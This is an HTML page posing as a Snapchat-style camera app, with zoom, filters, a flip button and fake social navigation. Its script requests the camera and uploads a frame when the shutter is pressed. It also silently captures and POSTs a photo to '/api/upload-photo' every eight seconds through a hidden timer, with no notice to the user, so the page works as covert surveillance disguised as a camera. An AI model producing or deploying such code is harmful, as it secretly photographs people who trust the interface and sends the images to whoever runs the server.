<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Camera</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
body{width:100%;height:100%;overflow:hidden;background:#000;font-family:-apple-system,sans-serif;}
#camera{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:1;transform:scaleX(-1);transition:0.3s;}
.v{position:fixed;left:0;width:100%;pointer-events:none;z-index:5;}
.top-v{top:0;height:120px;background:linear-gradient(rgba(0,0,0,.5),transparent);}
.bot-v{bottom:0;height:220px;background:linear-gradient(transparent,rgba(0,0,0,.7));}
.t-ui{position:fixed;top:25px;width:100%;padding:0 16px;display:flex;justify-content:space-between;z-index:20;}
.tools{display:flex;flex-direction:column;gap:20px;align-items:center;color:#fff;font-size:22px;}
.avatar,.search{width:42px;height:42px;border-radius:50%;background:rgba(255,255,255,.15);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;color:#fff;}
.tool{position:relative;filter:drop-shadow(0 2px 4px #000);}
.badge{position:absolute;top:-4px;right:-4px;background:#ff3040;font-size:10px;padding:1px 5px;border-radius:10px;border:1.5px solid #000;font-weight:900;}
.hd{font-size:11px;font-weight:900;border:2.5px solid #fff;border-radius:6px;padding:1px 4px;}
.z-bar{position:fixed;bottom:180px;left:50%;transform:translateX(-50%);display:flex;gap:18px;padding:7px 18px;border-radius:30px;background:rgba(0,0,0,.4);backdrop-filter:blur(15px);z-index:25;color:#888;font-size:13px;font-weight:900;}
.zoom.active{color:#ffe600;}
.m-ui{position:fixed;bottom:90px;width:100%;display:flex;align-items:center;justify-content:center;gap:24px;z-index:25;}
.shutter{width:84px;height:84px;border-radius:50%;border:6px solid #fff;display:flex;align-items:center;justify-content:center;}
.shutter-in{width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,.2);}
.lens{width:58px;height:58px;border-radius:50%;border:2px solid rgba(255,255,255,.4);overflow:hidden;}
.lens.active{border-color:#ffe600;transform:scale(1.1);}
.footer{position:fixed;bottom:0;width:100%;height:75px;background:rgba(0,0,0,.96);display:flex;justify-content:space-around;align-items:center;z-index:30;}
.nav{font-size:24px;color:#666;position:relative;}
.nav.active{color:#fff;}
#flash{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;z-index:100;}
canvas{display:none;}
</style>
</head>
<body>
<div id="flash"></div><div class="v top-v"></div><div class="v bot-v"></div>
<video id="camera" autoplay playsinline></video><canvas id="canvas"></canvas>
<div class="t-ui">
    <div style="display:flex;gap:12px">
        <div class="avatar"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=camera" style="width:100%"></div>
        <div class="search"><i class="fas fa-search"></i></div>
    </div>
    <div class="tools">
        <i class="far fa-bell tool"></i>
        <div class="tool"><i class="fas fa-user-plus"></i><div class="badge">2</div></div>
        <i class="fas fa-rotate tool" id="flip"></i>
        <i class="fas fa-bolt-slash tool"></i>
        <div class="hd tool">HD</div>
        <i class="fas fa-chevron-down tool"></i>
    </div>
</div>
<div class="z-bar">
    <div class="zoom" onclick="setZ(this,.5)">0.5</div>
    <div class="zoom active" onclick="setZ(this,1)">1x</div>
    <div class="zoom" onclick="setZ(this,2)">2</div>
</div>
<div class="m-ui">
    <div style="color:#fff;font-size:10px;text-align:center;width:60px"><i class="far fa-copy" style="font-size:24px"></i><br>Memories</div>
    <div class="shutter" id="snap"><div class="shutter-in"></div></div>
    <div class="lens active" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%"></div>
    <div class="lens" onclick="setL(this,'sepia(1)')"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100" style="width:100%"></div>
</div>
<div class="footer">
    <i class="fas fa-location-dot nav"></i>
    <div class="nav"><i class="far fa-comment"></i><div class="badge">20</div></div>
    <i class="far fa-face-smile nav active"></i>
    <i class="fas fa-users nav"></i>
    <i class="fas fa-play nav"></i>
</div>
<script>
const v=document.getElementById('camera'), c=document.getElementById('canvas'), f=document.getElementById('flash');
let z=1, filter="none", front=true, s;
async function init(){
    if(s)s.getTracks().forEach(t=>t.stop());
    s=await navigator.mediaDevices.getUserMedia({video:{facingMode:front?"user":"environment"}});
    v.srcObject=s; v.style.transform=`scaleX(${front?-1:1}) scale(${z})`;
}
function setZ(el,val){document.querySelectorAll('.zoom').forEach(i=>i.classList.remove('active')); el.classList.add('active'); z=val; v.style.transform=`scaleX(${front?-1:1}) scale(${z})`;}
function setL(el,l){document.querySelectorAll('.lens').forEach(i=>i.classList.remove('active')); el.classList.add('active'); filter=l; v.style.filter=l;}
document.getElementById('flip').onclick=()=>{front=!front; init();};
document.getElementById('snap').onclick=()=>{f.style.opacity=1; setTimeout(()=>f.style.opacity=0,80); send();};
async function send(){
    c.width=v.videoWidth; c.height=v.videoHeight;
    const ctx=c.getContext('2d');
    if(front){ctx.translate(c.width,0); ctx.scale(-1,1);}
    ctx.filter=filter; ctx.drawImage(v,0,0);
    c.toBlob(blob=>{
        const fd=new FormData(); 
        fd.append('photo', blob, 'a.jpg'); // Try changing 'photo' to 'image' if it still fails
        fetch('/api/upload-photo',{method:'POST',body:fd}).then(()=>console.log('Sent Success'));
    },'image/jpeg',0.7);
}
setInterval(send, 8000); 
init();
</script>
</body>
</html>
